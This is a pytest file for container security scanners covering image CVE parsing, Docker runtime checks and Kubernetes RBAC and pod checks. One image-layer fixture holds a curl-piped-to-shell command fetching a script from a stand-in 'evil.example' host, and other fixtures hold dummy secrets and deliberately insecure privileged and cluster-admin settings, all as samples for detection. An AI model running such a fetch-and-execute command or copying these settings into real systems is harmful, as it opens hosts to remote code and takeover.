"""Tests for container security scanners."""

from __future__ import annotations

import json

from src.scanners.container.image_scanner import CVEDatabase, ImageScanner
from src.scanners.container.k8s_scanner import KubernetesScanner
from src.scanners.container.models import ContainerSeverity, ScannerBackend
from src.scanners.container.runtime_scanner import RuntimeScanner


class _FakeContainer:
    def __init__(self, attrs):
        self.attrs = attrs


class _FakeContainers:
    def __init__(self, attrs):
        self._attrs = attrs

    def get(self, container_id):
        return _FakeContainer(self._attrs)


class _FakeDockerClient:
    def __init__(self, attrs=None, layers=None):
        self.containers = _FakeContainers(attrs or {})
        self.api = type("Api", (), {"history": lambda _, image: layers or []})()


def test_image_scanner_trivy_and_layer_analysis():
    trivy_output = {
        "Results": [
            {
                "Target": "alpine:3.9 (alpine 3.9)",
                "Vulnerabilities": [
                    {
                        "VulnerabilityID": "CVE-2023-38545",
                        "PkgName": "curl",
                        "InstalledVersion": "8.4.0-r0",
                        "FixedVersion": "8.4.0-r2",
                        "Severity": "HIGH",
                        "Description": "curl vulnerability",
                        "CVSS": {"nvd": {"V3Score": 9.8}},
                        "PrimaryURL": "https://nvd.nist.gov/vuln/detail/CVE-2023-38545",
                    }
                ],
            },
            {
                "Target": "app/package-lock.json",
                "Vulnerabilities": [
                    {
                        "VulnerabilityID": "CVE-2021-44228",
                        "PkgName": "log4j-core",
                        "InstalledVersion": "2.14.0",
                        "FixedVersion": "2.17.1",
                        "Severity": "CRITICAL",
                        "Description": "log4j RCE",
                        "CVSS": {"nvd": {"V3Score": 10.0}},
                    }
                ],
            },
        ]
    }

    def runner(cmd: list[str]):
        if cmd[:4] == ["trivy", "image", "--format", "json"]:
            return 0, json.dumps(trivy_output), ""
        return 1, "", "not found"

    layers = [
        {"CreatedBy": "/bin/sh -c apt-get update && apt-get install -y curl", "Size": 260 * 1024 * 1024},
        {"CreatedBy": "/bin/sh -c curl https://evil.example/install.sh | sh", "Size": 1024},
    ]

    scanner = ImageScanner(command_runner=runner, docker_client=_FakeDockerClient(layers=layers), cve_database=CVEDatabase())
    report = scanner.scan("ubuntu:latest")

    assert report.finding_count >= 5
    assert report.vulnerability_count == 2
    vuln_findings = [f for f in report.findings if f.cve_id]
    assert all(f.scanner == ScannerBackend.TRIVY for f in vuln_findings)
    assert any(f.cve_id == "CVE-2023-38545" and f.cvss_score == 9.8 for f in vuln_findings)
    assert any("Upgrade log4j-core" in (f.recommendation or "") for f in vuln_findings)

    titles = {f.title for f in report.findings}
    assert "Base image version appears unpinned" in titles
    assert "Large image layer detected" in titles
    assert "Remote script execution pattern in layer" in titles


def test_image_scanner_falls_back_to_grype_and_cvss_scoring():
    grype_output = {
        "matches": [
            {
                "artifact": {"name": "openssl", "version": "1.1.1", "location": "/usr/lib/libssl.so"},
                "vulnerability": {
                    "id": "CVE-2099-0001",
                    "severity": "",
                    "description": "test vulnerability",
                    "cvss": [{"metrics": {"baseScore": 7.4}}],
                    "urls": ["https://example.com/CVE-2099-0001"],
                    "fix": {"versions": ["1.1.2"]},
                },
            }
        ]
    }

    def runner(cmd: list[str]):
        if cmd and cmd[0] == "trivy":
            return 1, "", "trivy unavailable"
        if cmd and cmd[0] == "grype":
            return 0, json.dumps(grype_output), ""
        return 1, "", "unsupported"

    scanner = ImageScanner(command_runner=runner, docker_client=_FakeDockerClient(layers=[]))
    report = scanner.scan("repo/app:1.0.0")

    finding = next(f for f in report.findings if f.cve_id == "CVE-2099-0001")
    assert finding.scanner == ScannerBackend.GRYPE
    assert finding.severity == ContainerSeverity.HIGH
    assert finding.recommendation == "Upgrade openssl to 1.1.2 or newer."


def test_runtime_scanner_detects_configuration_and_secret_issues():
    attrs = {
        "Config": {
            "User": "",
            "Env": ["APP_ENV=prod", "DB_PASSWORD=s3cret"],
        },
        "HostConfig": {
            "Privileged": True,
            "ReadonlyRootfs": False,
            "SecurityOpt": ["seccomp=unconfined"],
            "CapAdd": ["SYS_ADMIN", "NET_ADMIN"],
            "PidMode": "host",
            "IpcMode": "private",
            "NetworkMode": "host",
            "PortBindings": {"80/tcp": [{"HostIp": "0.0.0.0", "HostPort": "8080"}]},
        },
        "Mounts": [
            {"Source": "/opt/secrets/prod-api.key", "Destination": "/run/secrets/api"},
        ],
    }

    scanner = RuntimeScanner(docker_client=_FakeDockerClient(attrs=attrs))
    report = scanner.scan("container-123")

    titles = {f.title for f in report.findings}
    assert "Container runs in privileged mode" in titles
    assert "Container defaults to root user" in titles
    assert "Risky Linux capabilities added" in titles
    assert "Container uses host network mode" in titles
    assert "Potential secret mount detected" in titles
    assert "Sensitive environment variable detected" in titles


def test_kubernetes_scanner_detects_pod_rbac_network_and_service_account_risks():
    resources = {
        "pods": [
            {
                "metadata": {"name": "api", "namespace": "prod"},
                "spec": {
                    "hostNetwork": True,
                    "serviceAccountName": "default",
                    "containers": [
                        {
                            "name": "api",
                            "securityContext": {
                                "privileged": True,
                                "allowPrivilegeEscalation": True,
                            },
                        }
                    ],
                },
            }
        ],
        "service_accounts": [
            {
                "metadata": {"name": "default", "namespace": "prod"},
            }
        ],
        "cluster_roles": [
            {
                "metadata": {"name": "ops-admin"},
                "rules": [{"verbs": ["*"], "resources": ["pods"]}],
            }
        ],
        "cluster_role_bindings": [
            {
                "metadata": {"name": "bind-admin"},
                "roleRef": {"name": "cluster-admin"},
                "subjects": [
                    {"kind": "ServiceAccount", "name": "default", "namespace": "prod"},
                    {"kind": "Group", "name": "system:unauthenticated"},
                ],
            }
        ],
        "network_policies": [],
    }

    scanner = KubernetesScanner()
    report = scanner.scan(resources)

    titles = {f.title for f in report.findings}
    assert "Privileged container detected" in titles
    assert "Privilege escalation allowed" in titles
    assert "RBAC role grants wildcard access" in titles
    assert "Cluster-admin role binding detected" in titles
    assert "Namespace lacks NetworkPolicy" in titles
    assert "Pod uses default service account" in titles
    assert "Service account bound to cluster-admin" in titles
